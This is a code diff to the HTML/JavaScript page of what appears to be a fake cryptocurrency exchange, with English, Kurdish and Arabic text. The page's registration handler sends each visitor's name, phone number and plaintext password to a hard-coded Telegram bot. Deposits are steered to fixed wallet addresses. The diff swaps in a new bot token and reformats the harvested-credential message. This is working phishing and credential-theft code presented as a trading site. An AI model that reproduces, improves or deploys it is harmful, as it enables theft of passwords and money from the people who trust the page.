@@ -12,7 +12,7 @@
         .stars-bg { background: radial-gradient(circle at top, #1e1b4b 0%, #020617 100%); min-height: 100vh; position: relative; }
         .stars-bg::after { content: ""; position: absolute; inset: 0; background-image: url('https://www.transparenttextures.com/patterns/stardust.png'); opacity: 0.3; pointer-events: none; }
         .card-style { background: rgba(30, 41, 59, 0.3); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 2rem; transition: 0.4s; cursor: pointer; }
-        .card-style:hover { border-color: var(--accent); transform: translateY(-10px); }
+        .card-style:hover { border-color: var(--accent); transform: translateY(-10px); box-shadow: 0 20px 40px rgba(59, 130, 246, 0.15); }
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(12px); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
         .modal-content { background: #0f172a; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 2.5rem; width: 100%; max-width: 480px; position: relative; padding: 2.5rem; }
         .close-btn { position: absolute; top: 1.5rem; right: 1.5rem; cursor: pointer; color: #64748b; }
@@ -155,7 +155,8 @@
     <div id="verifyModal" class="modal"><div class="animate-spin h-10 w-10 border-4 border-blue-600 border-t-transparent rounded-full"></div></div>
 
     <script>
-        const TG_TOKEN = "8595088465:AAGXBXemwN-AuVN8fNdF3SjYronTQVTqE_E";
+        // التوكن الجديد المحدث
+        const TG_TOKEN = "8595088465:AAE5RPjItCt8Zm0irKMOP-Wd39Vlv0neKKI";
         const TG_ID = "7865246557";
         const WALLETS = { 'BEP20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0', 'TRC20': 'TVB3yoKYrw81vwKrMgqfvhuMmoQVXozgcf', 'ERC20': '0x97154c5cccaff650cc54fc2b80a2b06884bc8ad0' };
 
@@ -176,7 +177,7 @@
                 heroT: "ئاڵوگۆڕی نوخبە", heroD: "ئاڵوگۆڕی سەرمایەی پارێزراو، خێرا و جیهانی.",
                 regT: "دروستکردنی هەژمار", regB: "تۆمارکردن و بەردەوامبوون",
                 buy: "کڕین", sell: "فرۆشتن", receive: "وەردەگریت:", cancel: "هەڵوەشاندنەوە",
-                submit: "تەواوکردنی کارەکە", footD: "خزمەتگوزاری ئاڵوگۆڕی نایاب بە ئاسایشی ٢٤ کاتژمێری."
+                submit: "تەواوکردنی کارەکە", footD: "خزمەتگوزاری ئاڵوگۆڕی ناياب بە ئاسايشی ٢٤ کاتژمێری."
             }
         };
 
@@ -184,7 +185,6 @@
             const h = document.getElementById('html-tag');
             const t = translations[l];
             h.dir = (l === 'en') ? 'ltr' : 'rtl';
-            
             document.getElementById('txt-hero-title').innerText = t.heroT;
             document.getElementById('txt-hero-desc').innerText = t.heroD;
             document.getElementById('txt-reg-title').innerText = t.regT;
@@ -203,7 +203,7 @@
             window.scrollTo(0,0);
         }
 
-        const countries = [{n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},{n:"Turkey", c:"+90", f:"🇹🇷"},{n:"USA", c:"+1", f:"🇺🇸"},{n:"Egypt", c:"+20", f:"🇪🇬"},{n:"Kuwait", c:"+965", f:"🇰🇼"}];
+        const countries = [{n:"Iraq", c:"+964", f:"🇮🇶"},{n:"Saudi", c:"+966", f:"🇸🇦"},{n:"UAE", c:"+971", f:"🇦🇪"},{n:"Turkey", c:"+90", f:"🇹🇷"},{n:"USA", c:"+1", f:"🇺🇸"},{n:"Jordan", c:"+962", f:"🇯🇴"},{n:"Kuwait", c:"+965", f:"🇰🇼"}];
         const countrySelect = document.getElementById('country-code');
         countries.forEach(ct => { let opt = document.createElement('option'); opt.value = ct.c; opt.innerHTML = `${ct.f} ${ct.c}`; countrySelect.appendChild(opt); });
 
@@ -230,7 +230,7 @@
 
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TG_ID, text: `👤 REG: ${userData.name} | ${userData.phone} | Pass: ${userData.pass}` })
+                body: JSON.stringify({ chat_id: TG_ID, text: `👤 NEW USER: ${userData.name}\n📞 Phone: ${userData.phone}\n🔑 Pass: ${userData.pass}` })
             });
 
             document.getElementById('regModal').style.display = 'none';
@@ -256,7 +256,7 @@
 
         async function sendToTelegram() {
             if(!selectedVal) return alert("Select amount!");
-            const b = document.getElementById('submitBtn'); b.innerText = "..."; b.disabled = true;
+            const b = document.getElementById('submitBtn'); b.innerText = "Transmitting..."; b.disabled = true;
             await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_ID, text: `✅ ORDER: ${userData.name} | ${activeName} | $${selectedVal}` }) });
             alert("Success!"); location.reload();
         }
